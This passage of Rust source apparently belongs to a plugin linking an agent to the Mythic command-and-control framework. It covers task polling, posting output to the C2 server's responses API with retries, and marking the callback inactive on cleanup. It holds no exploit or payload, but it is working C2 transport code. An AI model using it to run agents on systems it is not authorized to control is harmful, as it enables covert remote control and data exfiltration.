                                                trace!("No tasks available from Mythic");
                                            }
                                        }
                                    }
                                }
                            }
                        },
                        Err(e) => {
                            warn!("Failed to parse Mythic response: {}", e);
                        }
                    }
                } else {
                    warn!("Failed to get tasks from Mythic: {}", response.status());
                    if let Ok(text) = response.text().await {
                        debug!("Mythic error response: {}", text);
                    }
                    
                    // Increment retry count on error
                    if let Ok(mut count) = self.retry_count.lock() {
                        *count += 1;
                        if *count >= MAX_RETRY_ATTEMPTS {
                            warn!("Consecutive errors with Mythic API for {} attempts, marking as disconnected", MAX_RETRY_ATTEMPTS);
                            self.connection_state.store(false, Ordering::SeqCst);
                            *count = 0;
                        }
                    }
                }
            },
            Err(e) => {
                // Only log timeout errors at debug level since they're common during polling
                if e.is_timeout() {
                    debug!("Timeout while polling Mythic: {}", e);
                } else {
                    warn!("Failed to connect to Mythic: {}", e);
                    
                    // Increment retry count on connection error
                    if let Ok(mut count) = self.retry_count.lock() {
                        *count += 1;
                        if *count >= MAX_RETRY_ATTEMPTS {
                            warn!("Connection errors with Mythic for {} consecutive attempts, marking as disconnected", MAX_RETRY_ATTEMPTS);
                            self.connection_state.store(false, Ordering::SeqCst);
                            *count = 0;
                        }
                    }
                }
            }
        }
        
        // Return empty data if no tasks or error
        Ok(Vec::new())
    }
    
    async fn send(&self, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        // If not fully configured, just log and return
        if self.api_key.is_none() || self.callback_uuid.is_none() {
            warn!("Mythic plugin not fully configured, can't send data");
            return Ok(());
        }
        
        // Skip if we know we're not connected
        if !self.connection_state.load(Ordering::SeqCst) {
            warn!("Cannot send data - not connected to Mythic");
            return Ok(());
        }
        
        info!("Sending {} bytes to Mythic", data.len());
        
        // Try to send data to Mythic with retries
        let mut backoff = Self::create_backoff();
        let mut attempt = 0;
        let mut success = false;
        
        // Convert data to UTF-8 for Mythic API
        let output = String::from_utf8_lossy(data).to_string();
        debug!("Converting to UTF-8 for Mythic API");
        
        loop {
            attempt += 1;
            
            match self.client.post(&format!("{}/api/v1.4/responses/", self.url))
                .header("apitoken", self.api_key.as_ref().unwrap())
                .json(&serde_json::json!({
                    "response": output,
                    "callback_uuid": self.callback_uuid.as_ref().unwrap()
                }))
                .send()
                .await {
                    Ok(response) => {
                        if response.status().is_success() {
                            debug!("Successfully sent data to Mythic");
                            
                            // Add to buffer for logging/debugging
                            if let Err(e) = self.add_to_buffer(data) {
                                debug!("Failed to add to buffer: {}", e);
                            }
                            
                            // Reset retry count on successful send
                            if let Ok(mut count) = self.retry_count.lock() {
                                *count = 0;
                            }
                            
                            success = true;
                            break;
                        } else {
                            let status = response.status();
                            let error_text = response.text().await.unwrap_or_default();
                            warn!("Failed to send data to Mythic: {} - {}", status, error_text);
                            
                            // Increment retry count on API error
                            if let Ok(mut count) = self.retry_count.lock() {
                                *count += 1;
                                if *count >= MAX_RETRY_ATTEMPTS {
                                    warn!("API errors with Mythic for {} consecutive attempts, marking as disconnected", MAX_RETRY_ATTEMPTS);
                                    self.connection_state.store(false, Ordering::SeqCst);
                                    *count = 0;
                                }
                            }
                        }
                    },
                    Err(e) => {
                        warn!("Failed to connect to Mythic: {}", e);
                        
                        // Increment retry count on connection error
                        if let Ok(mut count) = self.retry_count.lock() {
                            *count += 1;
                            if *count >= MAX_RETRY_ATTEMPTS {
                                warn!("Connection errors with Mythic for {} consecutive attempts, marking as disconnected", MAX_RETRY_ATTEMPTS);
                                self.connection_state.store(false, Ordering::SeqCst);
                                *count = 0;
                            }
                        }
                    }
                }
            
            // Check if we should retry
            if attempt >= MAX_RETRY_ATTEMPTS || success {
                if !success {
                    warn!("Max retry attempts ({}) reached for sending data to Mythic", MAX_RETRY_ATTEMPTS);
                }
                break;
            }
            
            // Wait before retrying
            if let Some(backoff_duration) = backoff.next_backoff() {
                debug!("Retrying Mythic send in {:?} (attempt {}/{})", 
                      backoff_duration, attempt, MAX_RETRY_ATTEMPTS);
                tokio::time::sleep(backoff_duration).await;
            } else {
                break;
            }
        }
        
        if !success {
            warn!("Failed to send data to Mythic after {} attempts", attempt);
        }
        
        // Don't return an error, just log it
        Ok(())
    }
    
    fn name(&self) -> &str {
        &self.name
    }
    
    async fn cleanup(&self) -> Result<(), Box<dyn std::error::Error>> {
        info!("Cleaning up Mythic plugin");
        
        // If fully configured and connected, try to update callback status
        if self.connection_state.load(Ordering::SeqCst) && 
           self.api_key.is_some() && 
           self.callback_uuid.is_some() {
            debug!("Marking Mythic callback as inactive");
            match self.client.put(&format!(
                "{}/api/v1.4/callback/{}/active/false",
                self.url, 
                self.callback_uuid.as_ref().unwrap()
            ))
            .header("apitoken", self.api_key.as_ref().unwrap())
            .send()
            .await {
                Ok(response) => {
                    if response.status().is_success() {
                        info!("Successfully marked Mythic callback as inactive");
                    } else {
                        warn!("Failed to update Mythic callback status: {}", response.status());
                        if let Ok(text) = response.text().await {
                            debug!("Update error details: {}", text);
                        }
                    }
                },
                Err(e) => {
                    warn!("Failed to connect to Mythic during cleanup: {}", e);
                }
            }
            
            // Update connection state
            self.connection_state.store(false, Ordering::SeqCst);
        }
        
        // Clear the buffer
        if let Ok(mut buffer) = self.buffer.lock() {
            buffer.clear();
            debug!("Cleared Mythic buffer");
        } else {
            warn!("Failed to lock buffer for clearing");
        }
        
        Ok(())
    }
} 